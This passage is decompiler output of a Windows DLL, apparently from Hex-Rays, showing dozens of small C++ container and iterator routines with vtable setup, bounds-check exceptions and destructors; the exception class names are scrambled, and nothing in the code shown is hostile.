  (*(void (__thiscall **)(void *, int *))(*(_DWORD *)this + 12))(this, v1);
  v2 = 0;
  while ( !(*(unsigned __int8 (__thiscall **)(int))(*(_DWORD *)v1[0] + 4))(v1[0]) )
    (*(void (__thiscall **)(int))(*(_DWORD *)v1[0] + 24))(v1[0]);
  v2 = -1;
  sub_10020585(v1);
}

//----- (1001EA1B) --------------------------------------------------------
_DWORD *__thiscall sub_1001EA1B(void *this, _DWORD *a2)
{
  _DWORD *v3; // eax
  _DWORD *v4; // eax

  v3 = operator new(0xCu);
  if ( v3 )
    v4 = sub_1001F4B3(this, v3, 0);
  else
    v4 = 0;
  sub_100205CA(a2, (int)v4);
  return a2;
}
// 1004CBC8: using guessed type void *__cdecl operator new(size_t Size);

//----- (1001EA6E) --------------------------------------------------------
_DWORD *__thiscall sub_1001EA6E(void *this, _DWORD *a2)
{
  _DWORD *v3; // eax
  _DWORD *v4; // eax

  v3 = operator new(0xCu);
  if ( v3 )
    v4 = sub_1001F61D(this, v3, 0);
  else
    v4 = 0;
  sub_10020458(a2, (int)v4);
  return a2;
}
// 1004CBC8: using guessed type void *__cdecl operator new(size_t Size);

//----- (1001EAC1) --------------------------------------------------------
_DWORD *__thiscall sub_1001EAC1(void *this, _DWORD *a2)
{
  int v3; // eax
  _DWORD *v4; // eax
  _DWORD *Block; // [esp+14h] [ebp-10h]

  Block = operator new(0xCu);
  if ( Block )
  {
    v3 = (*(int (__thiscall **)(void *))(*(_DWORD *)this + 4))(this);
    v4 = sub_1001F4B3(this, Block, v3);
  }
  else
  {
    v4 = 0;
  }
  sub_100205CA(a2, (int)v4);
  return a2;
}
// 1004CBC8: using guessed type void *__cdecl operator new(size_t Size);

//----- (1001EB1C) --------------------------------------------------------
_DWORD *__thiscall sub_1001EB1C(void *this, _DWORD *a2)
{
  int v3; // eax
  _DWORD *v4; // eax
  _DWORD *Block; // [esp+14h] [ebp-10h]

  Block = operator new(0xCu);
  if ( Block )
  {
    v3 = (*(int (__thiscall **)(void *))(*(_DWORD *)this + 4))(this);
    v4 = sub_1001F61D(this, Block, v3);
  }
  else
  {
    v4 = 0;
  }
  sub_10020458(a2, (int)v4);
  return a2;
}
// 1004CBC8: using guessed type void *__cdecl operator new(size_t Size);

//----- (1001EB77) --------------------------------------------------------
_DWORD *__thiscall sub_1001EB77(void *this, _DWORD *a2, unsigned int pExceptionObject)
{
  unsigned int v4; // eax
  _DWORD *v5; // eax
  _DWORD *v6; // eax

  v4 = (*(int (__thiscall **)(void *))(*(_DWORD *)this + 4))(this);
  if ( pExceptionObject > v4 )
  {
    sub_1001668F(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  v5 = operator new(0xCu);
  if ( v5 )
    v6 = sub_1001F4B3(this, v5, pExceptionObject);
  else
    v6 = 0;
  sub_100205CA(a2, (int)v6);
  return a2;
}
// 1004CBC8: using guessed type void *__cdecl operator new(size_t Size);

//----- (1001EBEC) --------------------------------------------------------
_DWORD *__thiscall sub_1001EBEC(void *this, _DWORD *a2, unsigned int pExceptionObject)
{
  unsigned int v4; // eax
  _DWORD *v5; // eax
  _DWORD *v6; // eax

  v4 = (*(int (__thiscall **)(void *))(*(_DWORD *)this + 4))(this);
  if ( pExceptionObject > v4 )
  {
    sub_1001668F(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  v5 = operator new(0xCu);
  if ( v5 )
    v6 = sub_1001F61D(this, v5, pExceptionObject);
  else
    v6 = 0;
  sub_10020458(a2, (int)v6);
  return a2;
}
// 1004CBC8: using guessed type void *__cdecl operator new(size_t Size);

//----- (1001EC61) --------------------------------------------------------
void __thiscall sub_1001EC61(_DWORD *this)
{
  *this = &off_100943BC;
  *this = off_10092F20;
}
// 10092F20: using guessed type int (__thiscall *off_10092F20[2])(void *Block, char);
// 100943BC: using guessed type int (__thiscall *off_100943BC)(void *Block, char);

//----- (1001EC86) --------------------------------------------------------
int *__thiscall sub_1001EC86(void *this, int *a2, unsigned int pExceptionObject)
{
  unsigned int v4; // eax
  int v5; // ecx
  unsigned int v6; // ebx

  v4 = (*(int (__thiscall **)(void *))(*(_DWORD *)this + 4))(this);
  if ( pExceptionObject > v4 )
  {
    sub_1001668F(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  (*(void (__thiscall **)(void *, int *))(*(_DWORD *)this + 12))(this, a2);
  if ( pExceptionObject )
  {
    v6 = pExceptionObject;
    do
    {
      sub_1001F0CF(v5, *a2);
      --v6;
    }
    while ( v6 );
  }
  return a2;
}
// 1001ECDC: variable 'v5' is possibly undefined

//----- (1001ECEE) --------------------------------------------------------
int *__thiscall sub_1001ECEE(void *this, int *a2, unsigned int pExceptionObject)
{
  unsigned int v4; // eax
  int v5; // ecx
  unsigned int v6; // ebx

  v4 = (*(int (__thiscall **)(void *))(*(_DWORD *)this + 4))(this);
  if ( pExceptionObject > v4 )
  {
    sub_1001668F(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  (*(void (__thiscall **)(void *, int *))(*(_DWORD *)this + 8))(this, a2);
  if ( pExceptionObject )
  {
    v6 = pExceptionObject;
    do
    {
      sub_1001EFF9(v5, *a2);
      --v6;
    }
    while ( v6 );
  }
  return a2;
}
// 1001ED44: variable 'v5' is possibly undefined

//----- (1001ED56) --------------------------------------------------------
void __thiscall sub_1001ED56(void *this, int a2)
{
  int v2[4]; // [esp+10h] [ebp-14h] BYREF
  int v3; // [esp+20h] [ebp-4h]

  (*(void (__thiscall **)(void *, int *))(*(_DWORD *)this + 20))(this, v2);
  v3 = 0;
  (*(void (__thiscall **)(int, int))(*(_DWORD *)v2[0] + 28))(v2[0], a2);
  v3 = -1;
  sub_10020609(v2);
}

//----- (1001ED8E) --------------------------------------------------------
void __thiscall sub_1001ED8E(void *this, int a2, int a3)
{
  int v3[4]; // [esp+10h] [ebp-14h] BYREF
  int v4; // [esp+20h] [ebp-4h]

  (*(void (__thiscall **)(void *, int *, int))(*(_DWORD *)this + 28))(this, v3, a3);
  v4 = 0;
  (*(void (__thiscall **)(int, int))(*(_DWORD *)v3[0] + 28))(v3[0], a2);
  v4 = -1;
  sub_10020609(v3);
}

//----- (1001EDC9) --------------------------------------------------------
void __thiscall sub_1001EDC9(void *this, int a2)
{
  int v2[4]; // [esp+10h] [ebp-14h] BYREF
  int v3; // [esp+20h] [ebp-4h]

  (*(void (__thiscall **)(void *, int *, int))(*(_DWORD *)this + 28))(this, v2, a2);
  v3 = 0;
  (*(void (__thiscall **)(int))(*(_DWORD *)v2[0] + 24))(v2[0]);
  v3 = -1;
  sub_10020609(v2);
}

//----- (1001EE01) --------------------------------------------------------
int __thiscall sub_1001EE01(void *this, int a2)
{
  int v2; // esi
  int v4[4]; // [esp+10h] [ebp-14h] BYREF
  int v5; // [esp+20h] [ebp-4h]

  (*(void (__thiscall **)(void *, int *, int))(*(_DWORD *)this + 24))(this, v4, a2);
  v5 = 0;
  v2 = (*(int (__thiscall **)(int))(*(_DWORD *)v4[0] + 12))(v4[0]);
  v5 = -1;
  sub_10020497(v4);
  return v2;
}

//----- (1001EE3D) --------------------------------------------------------
int __thiscall sub_1001EE3D(void *this, int a2)
{
  int v2; // esi
  int v4[4]; // [esp+10h] [ebp-14h] BYREF
  int v5; // [esp+20h] [ebp-4h]

  (*(void (__thiscall **)(void *, int *, int))(*(_DWORD *)this + 28))(this, v4, a2);
  v5 = 0;
  v2 = (*(int (__thiscall **)(int))(*(_DWORD *)v4[0] + 12))(v4[0]);
  v5 = -1;
  sub_10020609(v4);
  return v2;
}

//----- (1001EE79) --------------------------------------------------------
void __thiscall sub_1001EE79(void *this)
{
  int v1[4]; // [esp+10h] [ebp-14h] BYREF
  int v2; // [esp+20h] [ebp-4h]

  (*(void (__thiscall **)(void *, int *))(*(_DWORD *)this + 12))(this, v1);
  v2 = 0;
  while ( !(*(unsigned __int8 (__thiscall **)(int))(*(_DWORD *)v1[0] + 4))(v1[0]) )
    (*(void (__thiscall **)(int))(*(_DWORD *)v1[0] + 24))(v1[0]);
  v2 = -1;
  sub_10020609(v1);
}

//----- (1001EEC1) --------------------------------------------------------
_DWORD *__thiscall sub_1001EEC1(_DWORD *Block, char a2)
{
  sub_1001E47D(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (1001EEE0) --------------------------------------------------------
_DWORD *__thiscall sub_1001EEE0(_DWORD *Block, char a2)
{
  *Block = &off_10094210;
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}
// 10094210: using guessed type int (__thiscall *off_10094210)(void *Block, char);

//----- (1001EF00) --------------------------------------------------------
_DWORD *__thiscall sub_1001EF00(_DWORD *Block, char a2)
{
  *Block = &off_10094230;
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}
// 10094230: using guessed type int (__thiscall *off_10094230)(void *Block, char);

//----- (1001EF20) --------------------------------------------------------
_DWORD *__thiscall sub_1001EF20(_DWORD *Block, char a2)
{
  *Block = &off_10094250;
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}
// 10094250: using guessed type int (__thiscall *off_10094250)(void *Block, char);

//----- (1001EF40) --------------------------------------------------------
_DWORD *__thiscall sub_1001EF40(_DWORD *Block, char a2)
{
  sub_1001E7BB(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (1001EF5F) --------------------------------------------------------
_DWORD *__thiscall sub_1001EF5F(_DWORD *Block, char a2)
{
  *Block = &off_1009439C;
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}
// 1009439C: using guessed type int (__thiscall *off_1009439C)(void *Block, char);

//----- (1001EF7F) --------------------------------------------------------
_DWORD *__thiscall sub_1001EF7F(_DWORD *Block, char a2)
{
  sub_1001EC61(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (1001EF9E) --------------------------------------------------------
_DWORD *__thiscall sub_1001EF9E(_DWORD *Block, char a2)
{
  *Block = &off_100943F4;
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}
// 100943F4: using guessed type int (__thiscall *off_100943F4)(void *Block, char);

//----- (1001EFC3) --------------------------------------------------------
int __usercall sub_1001EFC3@<eax>(int a1@<ecx>, int a2@<esi>)
{
  int pExceptionObject; // [esp+0h] [ebp-4h] BYREF

  if ( (*(unsigned __int8 (__thiscall **)(int, int))(*(_DWORD *)a2 + 4))(a2, a1) )
  {
    sub_1001668F(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  (*(void (__thiscall **)(int))(*(_DWORD *)a2 + 16))(a2);
  return a2;
}

//----- (1001EFF9) --------------------------------------------------------
int __usercall sub_1001EFF9@<eax>(int a1@<ecx>, int a2@<esi>)
{
  int pExceptionObject; // [esp+0h] [ebp-4h] BYREF

  if ( (*(unsigned __int8 (__thiscall **)(int, int))(*(_DWORD *)a2 + 4))(a2, a1) )
  {
    sub_1001668F(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  (*(void (__thiscall **)(int))(*(_DWORD *)a2 + 16))(a2);
  return a2;
}

//----- (1001F02A) --------------------------------------------------------
int __thiscall sub_1001F02A(void *this, int a2)
{
  (*(void (__thiscall **)(void *, int))(*(_DWORD *)this + 8))(this, a2);
  return a2;
}

//----- (1001F05D) --------------------------------------------------------
int __usercall sub_1001F05D@<eax>(int a1@<ecx>, int a2@<esi>)
{
  int pExceptionObject; // [esp+0h] [ebp-4h] BYREF

  if ( (*(unsigned __int8 (__thiscall **)(int, int))(*(_DWORD *)a2 + 4))(a2, a1) )
  {
    sub_1001668F(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  (*(void (__thiscall **)(int))(*(_DWORD *)a2 + 16))(a2);
  return a2;
}

//----- (1001F09C) --------------------------------------------------------
int __thiscall sub_1001F09C(void *this, int a2)
{
  (*(void (__thiscall **)(void *, int))(*(_DWORD *)this + 8))(this, a2);
  return a2;
}

//----- (1001F0CF) --------------------------------------------------------
int __usercall sub_1001F0CF@<eax>(int a1@<ecx>, int a2@<esi>)
{
  int pExceptionObject; // [esp+0h] [ebp-4h] BYREF

  if ( (*(unsigned __int8 (__thiscall **)(int, int))(*(_DWORD *)a2 + 4))(a2, a1) )
  {
    sub_1001668F(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  (*(void (__thiscall **)(int))(*(_DWORD *)a2 + 16))(a2);
  return a2;
}

//----- (1001F10E) --------------------------------------------------------
_DWORD *__thiscall sub_1001F10E(void *this, _DWORD *a2)
{
  _DWORD *result; // eax

  result = a2;
  *a2 = &off_10094210;
  a2[1] = this;
  *a2 = &off_10094414;
  a2[2] = off_1009420C;
  a2[5] = 0;
  return result;
}
// 1009420C: using guessed type int (__thiscall *off_1009420C[2])(void *Block, char);
// 10094210: using guessed type int (__thiscall *off_10094210)(void *Block, char);
// 10094414: using guessed type int (__thiscall *off_10094414)(void *Block, char);

//----- (1001F14B) --------------------------------------------------------
BOOL __thiscall sub_1001F14B(int this)
{
  return *(_DWORD *)(this + 20) >= (unsigned int)(*(int (__thiscall **)(_DWORD))(**(_DWORD **)(this + 4) + 4))(*(_DWORD *)(this + 4));
}

//----- (1001F15E) --------------------------------------------------------
BOOL __thiscall sub_1001F15E(_DWORD *this)
{
  return this[5] != 0;
}

//----- (1001F168) --------------------------------------------------------
int __thiscall sub_1001F168(int this)
{
  _DWORD *v2; // eax
  int v4; // [esp-4h] [ebp-8h]

  v2 = (_DWORD *)(*(int (__thiscall **)(int, _DWORD))(*(_DWORD *)(*(_DWORD *)(this + 4) + 4) + 44))(
                   *(_DWORD *)(this + 4) + 4,
                   *(_DWORD *)(this + 20));
  v4 = *(_DWORD *)(this + 20);
  *(_DWORD *)(this + 12) = *v2;
  *(_BYTE *)(this + 16) = *(_BYTE *)(*(int (__thiscall **)(int, int))(*(_DWORD *)(*(_DWORD *)(this + 4) + 20) + 44))(
                                      *(_DWORD *)(this + 4) + 20,
                                      v4);
  return this + 8;
}

//----- (1001F196) --------------------------------------------------------
void __thiscall sub_1001F196(_DWORD *this)
{
  ++this[5];
}

//----- (1001F19A) --------------------------------------------------------
void __thiscall sub_1001F19A(_DWORD *this)
{
  --this[5];
}

//----- (1001F19E) --------------------------------------------------------
void __noreturn sub_1001F19E()
{
  _DWORD pExceptionObject[2]; // [esp+0h] [ebp-8h] BYREF

  sub_100166E1(pExceptionObject);
  _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVDkpOsublklbcJnkmkirtg_sr__);
}
// 1001F19E: using guessed type void __noreturn sub_1001F19E();
// 1001F19E: using guessed type _DWORD pExceptionObject[2];

//----- (1001F1BB) --------------------------------------------------------
void __noreturn sub_1001F1BB()
{
  _DWORD pExceptionObject[2]; // [esp+0h] [ebp-8h] BYREF

  sub_100166E1(pExceptionObject);
  _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVDkpOsublklbcJnkmkirtg_sr__);
}
// 1001F1BB: using guessed type void __noreturn sub_1001F1BB();
// 1001F1BB: using guessed type _DWORD pExceptionObject[2];

//----- (1001F1DF) --------------------------------------------------------
_DWORD *__thiscall sub_1001F1DF(void *this, _DWORD *a2, int a3)
{
  _DWORD *result; // eax

  result = a2;
  *a2 = &off_1009439C;
  a2[1] = this;
  *a2 = &off_10094434;
  a2[2] = a3;
  return result;
}
// 1009439C: using guessed type int (__thiscall *off_1009439C)(void *Block, char);
// 10094434: using guessed type int (__thiscall *off_10094434)(void *Block, char);

//----- (1001F213) --------------------------------------------------------
void __thiscall sub_1001F213(_DWORD *this)
{
  *this = &off_10094434;
  *this = &off_1009439C;
}
// 1009439C: using guessed type int (__thiscall *off_1009439C)(void *Block, char);
// 10094434: using guessed type int (__thiscall *off_10094434)(void *Block, char);

//----- (1001F238) --------------------------------------------------------
bool __thiscall sub_1001F238(int this)
{
  return *(_DWORD *)(this + 8) == (*(int (__thiscall **)(_DWORD))(**(_DWORD **)(this + 4) + 4))(*(_DWORD *)(this + 4));
}

//----- (1001F24F) --------------------------------------------------------
BOOL __thiscall sub_1001F24F(_DWORD *this)
{
  return this[2] != 0;
}

//----- (1001F259) --------------------------------------------------------
int __thiscall sub_1001F259(int this)
{
  int v2; // edi
  int pExceptionObject; // [esp+8h] [ebp-4h] BYREF

  v2 = *(_DWORD *)(this + 8);
  if ( v2 == (*(int (__thiscall **)(_DWORD))(**(_DWORD **)(this + 4) + 4))(*(_DWORD *)(this + 4)) )
  {
    sub_1001668F(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  return (*(int (__thiscall **)(_DWORD, int))(**(_DWORD **)(this + 4) + 44))(*(_DWORD *)(this + 4), v2);
}

//----- (1001F294) --------------------------------------------------------
int __thiscall sub_1001F294(int this)
{
  int v2; // edi
  int result; // eax
  int pExceptionObject; // [esp+8h] [ebp-4h] BYREF

  v2 = *(_DWORD *)(this + 8);
  result = (*(int (__thiscall **)(_DWORD))(**(_DWORD **)(this + 4) + 4))(*(_DWORD *)(this + 4));
  if ( v2 == result )
  {
    sub_1001668F(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  *(_DWORD *)(this + 8) = v2 + 1;
  return result;
}

//----- (1001F2CA) --------------------------------------------------------
int __thiscall sub_1001F2CA(_DWORD *this)
{
  int v1; // eax
  int result; // eax
  _DWORD *pExceptionObject; // [esp+0h] [ebp-4h] BYREF

  pExceptionObject = this;
  v1 = this[2];
  if ( !v1 )
  {
    sub_1001668F(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  result = v1 - 1;
  this[2] = result;
  return result;
}

//----- (1001F2F2) --------------------------------------------------------
int __thiscall sub_1001F2F2(int this)
{
  int v2; // edi
  int pExceptionObject; // [esp+8h] [ebp-4h] BYREF

  v2 = *(_DWORD *)(this + 8);
  if ( v2 == (*(int (__thiscall **)(_DWORD))(**(_DWORD **)(this + 4) + 4))(*(_DWORD *)(this + 4)) )
  {
    sub_1001668F(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  return (*(int (__thiscall **)(_DWORD, int))(**(_DWORD **)(this + 4) + 40))(*(_DWORD *)(this + 4), v2);
}

//----- (1001F32D) --------------------------------------------------------
int __thiscall sub_1001F32D(int this, int a2)
{
  int v2; // eax

  v2 = *(_DWORD *)(this + 8);
  *(_DWORD *)(this + 8) = v2 + 1;
  return (*(int (__thiscall **)(_DWORD, int, int))(**(_DWORD **)(this + 4) + 32))(*(_DWORD *)(this + 4), a2, v2);
}

//----- (1001F349) --------------------------------------------------------
_DWORD *__thiscall sub_1001F349(void *this, _DWORD *a2, int a3)
{
  _DWORD *result; // eax

  result = a2;
  *a2 = &off_10094230;
  a2[1] = this;
  *a2 = &off_10094454;
  a2[2] = a3;
  return result;
}
// 10094230: using guessed type int (__thiscall *off_10094230)(void *Block, char);
// 10094454: using guessed type int (__thiscall *off_10094454)(void *Block, char);

//----- (1001F37D) --------------------------------------------------------
void __thiscall sub_1001F37D(_DWORD *this)
{
  *this = &off_10094454;
  *this = &off_10094230;
}
// 10094230: using guessed type int (__thiscall *off_10094230)(void *Block, char);
// 10094454: using guessed type int (__thiscall *off_10094454)(void *Block, char);

//----- (1001F3A2) --------------------------------------------------------
bool __thiscall sub_1001F3A2(int this)
{
  return *(_DWORD *)(this + 8) == (*(int (__thiscall **)(_DWORD))(**(_DWORD **)(this + 4) + 4))(*(_DWORD *)(this + 4));
}

//----- (1001F3B9) --------------------------------------------------------
BOOL __thiscall sub_1001F3B9(_DWORD *this)
{
  return this[2] != 0;
}

//----- (1001F3C3) --------------------------------------------------------
int __thiscall sub_1001F3C3(int this)
{
  int v2; // edi
  int pExceptionObject; // [esp+8h] [ebp-4h] BYREF

  v2 = *(_DWORD *)(this + 8);
  if ( v2 == (*(int (__thiscall **)(_DWORD))(**(_DWORD **)(this + 4) + 4))(*(_DWORD *)(this + 4)) )
  {
    sub_1001668F(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  return (*(int (__thiscall **)(_DWORD, int))(**(_DWORD **)(this + 4) + 44))(*(_DWORD *)(this + 4), v2);
}

//----- (1001F3FE) --------------------------------------------------------
int __thiscall sub_1001F3FE(int this)
{
  int v2; // edi
  int result; // eax
  int pExceptionObject; // [esp+8h] [ebp-4h] BYREF

  v2 = *(_DWORD *)(this + 8);
  result = (*(int (__thiscall **)(_DWORD))(**(_DWORD **)(this + 4) + 4))(*(_DWORD *)(this + 4));
  if ( v2 == result )
  {
    sub_1001668F(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  *(_DWORD *)(this + 8) = v2 + 1;
  return result;
}

//----- (1001F434) --------------------------------------------------------
int __thiscall sub_1001F434(_DWORD *this)
{
  int v1; // eax
  int result; // eax
  _DWORD *pExceptionObject; // [esp+0h] [ebp-4h] BYREF

  pExceptionObject = this;
  v1 = this[2];
  if ( !v1 )
  {
    sub_1001668F(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  result = v1 - 1;
  this[2] = result;
  return result;
}

//----- (1001F45C) --------------------------------------------------------
int __thiscall sub_1001F45C(int this)
{
  int v2; // edi
  int pExceptionObject; // [esp+8h] [ebp-4h] BYREF

  v2 = *(_DWORD *)(this + 8);
  if ( v2 == (*(int (__thiscall **)(_DWORD))(**(_DWORD **)(this + 4) + 4))(*(_DWORD *)(this + 4)) )
  {
    sub_1001668F(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  return (*(int (__thiscall **)(_DWORD, int))(**(_DWORD **)(this + 4) + 40))(*(_DWORD *)(this + 4), v2);
}

//----- (1001F497) --------------------------------------------------------
int __thiscall sub_1001F497(int this, int a2)
{
  int v2; // eax

  v2 = *(_DWORD *)(this + 8);
  *(_DWORD *)(this + 8) = v2 + 1;
  return (*(int (__thiscall **)(_DWORD, int, int))(**(_DWORD **)(this + 4) + 32))(*(_DWORD *)(this + 4), a2, v2);
}

//----- (1001F4B3) --------------------------------------------------------
_DWORD *__thiscall sub_1001F4B3(void *this, _DWORD *a2, int a3)
{
  _DWORD *result; // eax

  result = a2;
  *a2 = &off_100943F4;
  a2[1] = this;
  *a2 = &off_10094474;
  a2[2] = a3;
  return result;
}
// 100943F4: using guessed type int (__thiscall *off_100943F4)(void *Block, char);
// 10094474: using guessed type int (__thiscall *off_10094474)(void *Block, char);

//----- (1001F4E7) --------------------------------------------------------
void __thiscall sub_1001F4E7(_DWORD *this)
{
  *this = &off_10094474;
  *this = &off_100943F4;
}
// 100943F4: using guessed type int (__thiscall *off_100943F4)(void *Block, char);
// 10094474: using guessed type int (__thiscall *off_10094474)(void *Block, char);

//----- (1001F50C) --------------------------------------------------------
bool __thiscall sub_1001F50C(int this)
{
  return *(_DWORD *)(this + 8) == (*(int (__thiscall **)(_DWORD))(**(_DWORD **)(this + 4) + 4))(*(_DWORD *)(this + 4));
}

//----- (1001F523) --------------------------------------------------------
BOOL __thiscall sub_1001F523(_DWORD *this)
{
  return this[2] != 0;
}

//----- (1001F52D) --------------------------------------------------------
int __thiscall sub_1001F52D(int this)
{
  int v2; // edi
  int pExceptionObject; // [esp+8h] [ebp-4h] BYREF

  v2 = *(_DWORD *)(this + 8);
  if ( v2 == (*(int (__thiscall **)(_DWORD))(**(_DWORD **)(this + 4) + 4))(*(_DWORD *)(this + 4)) )
  {
    sub_1001668F(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  return (*(int (__thiscall **)(_DWORD, int))(**(_DWORD **)(this + 4) + 44))(*(_DWORD *)(this + 4), v2);
}

//----- (1001F568) --------------------------------------------------------
int __thiscall sub_1001F568(int this)
{
  int v2; // edi
  int result; // eax
  int pExceptionObject; // [esp+8h] [ebp-4h] BYREF

  v2 = *(_DWORD *)(this + 8);
  result = (*(int (__thiscall **)(_DWORD))(**(_DWORD **)(this + 4) + 4))(*(_DWORD *)(this + 4));
  if ( v2 == result )
  {
    sub_1001668F(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  *(_DWORD *)(this + 8) = v2 + 1;
  return result;
}

//----- (1001F59E) --------------------------------------------------------
int __thiscall sub_1001F59E(_DWORD *this)
{
  int v1; // eax
  int result; // eax
  _DWORD *pExceptionObject; // [esp+0h] [ebp-4h] BYREF

  pExceptionObject = this;
  v1 = this[2];
  if ( !v1 )
  {
    sub_1001668F(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  result = v1 - 1;
  this[2] = result;
  return result;
}

//----- (1001F5C6) --------------------------------------------------------
int __thiscall sub_1001F5C6(int this)
{
  int v2; // edi
  int pExceptionObject; // [esp+8h] [ebp-4h] BYREF

  v2 = *(_DWORD *)(this + 8);
  if ( v2 == (*(int (__thiscall **)(_DWORD))(**(_DWORD **)(this + 4) + 4))(*(_DWORD *)(this + 4)) )
  {
    sub_1001668F(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  return (*(int (__thiscall **)(_DWORD, int))(**(_DWORD **)(this + 4) + 40))(*(_DWORD *)(this + 4), v2);
}

//----- (1001F601) --------------------------------------------------------
int __thiscall sub_1001F601(int this, int a2)
{
  int v2; // eax

  v2 = *(_DWORD *)(this + 8);
  *(_DWORD *)(this + 8) = v2 + 1;
  return (*(int (__thiscall **)(_DWORD, int, int))(**(_DWORD **)(this + 4) + 32))(*(_DWORD *)(this + 4), a2, v2);
}

//----- (1001F61D) --------------------------------------------------------
_DWORD *__thiscall sub_1001F61D(void *this, _DWORD *a2, int a3)
{
  _DWORD *result; // eax

  result = a2;
  *a2 = &off_10094250;
  a2[1] = this;
  *a2 = &off_10094494;
  a2[2] = a3;
  return result;
}
// 10094250: using guessed type int (__thiscall *off_10094250)(void *Block, char);
// 10094494: using guessed type int (__thiscall *off_10094494)(void *Block, char);

//----- (1001F651) --------------------------------------------------------
void __thiscall sub_1001F651(_DWORD *this)
{
  *this = &off_10094494;
  *this = &off_10094250;
}
// 10094250: using guessed type int (__thiscall *off_10094250)(void *Block, char);
// 10094494: using guessed type int (__thiscall *off_10094494)(void *Block, char);

//----- (1001F676) --------------------------------------------------------
bool __thiscall sub_1001F676(int this)
{
  return *(_DWORD *)(this + 8) == (*(int (__thiscall **)(_DWORD))(**(_DWORD **)(this + 4) + 4))(*(_DWORD *)(this + 4));
}

//----- (1001F68D) --------------------------------------------------------
BOOL __thiscall sub_1001F68D(_DWORD *this)
{
  return this[2] != 0;
}

//----- (1001F697) --------------------------------------------------------
int __thiscall sub_1001F697(int this)
{
  int v2; // edi
  int pExceptionObject; // [esp+8h] [ebp-4h] BYREF

  v2 = *(_DWORD *)(this + 8);
  if ( v2 == (*(int (__thiscall **)(_DWORD))(**(_DWORD **)(this + 4) + 4))(*(_DWORD *)(this + 4)) )
  {
    sub_1001668F(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  return (*(int (__thiscall **)(_DWORD, int))(**(_DWORD **)(this + 4) + 44))(*(_DWORD *)(this + 4), v2);
}

//----- (1001F6D2) --------------------------------------------------------
int __thiscall sub_1001F6D2(int this)
{
  int v2; // edi
  int result; // eax
  int pExceptionObject; // [esp+8h] [ebp-4h] BYREF

  v2 = *(_DWORD *)(this + 8);
  result = (*(int (__thiscall **)(_DWORD))(**(_DWORD **)(this + 4) + 4))(*(_DWORD *)(this + 4));
  if ( v2 == result )
  {
    sub_1001668F(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  *(_DWORD *)(this + 8) = v2 + 1;
  return result;
}

//----- (1001F708) --------------------------------------------------------
int __thiscall sub_1001F708(_DWORD *this)
{
  int v1; // eax
  int result; // eax
  _DWORD *pExceptionObject; // [esp+0h] [ebp-4h] BYREF

  pExceptionObject = this;
  v1 = this[2];
  if ( !v1 )
  {
    sub_1001668F(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  result = v1 - 1;
  this[2] = result;
  return result;
}

